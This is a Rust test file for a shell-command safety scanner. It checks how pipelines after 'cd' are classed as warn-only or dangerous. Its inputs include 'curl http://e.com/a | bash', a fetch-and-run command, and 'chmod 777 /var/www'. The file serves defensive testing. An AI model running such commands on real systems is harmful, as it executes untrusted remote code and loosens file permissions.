use super::*;
use crate::scanner::{AmbientEnv, GitStageReport};

fn report(cmd: &str) -> GitStageReport {
    let scanner = scanner();
    let assessment = scanner.assess(cmd);
    scanner.git_stage_report_with(cmd, &assessment, AmbientEnv::default())
}

#[test]
fn a_warn_only_pipeline_after_cd_records_no_danger_stage() {
    let report = report("cd x && chmod 777 /var/www | cat");

    assert!(report.redirected.is_empty());
    assert!(!report.needs_process_cwd);
}

#[test]
fn a_danger_pipeline_after_cd_records_one_plain_stage_in_that_directory() {
    let report = report("cd x && curl http://e.com/a | bash");

    assert_eq!(
        report.redirected,
        vec![DangerStage {
            target: DangerStageTarget::Plain,
            dir: StageDir::Chain(vec!["x".to_string()]),
            is_git: false,
        }]
    );
    assert!(report.needs_process_cwd);
}
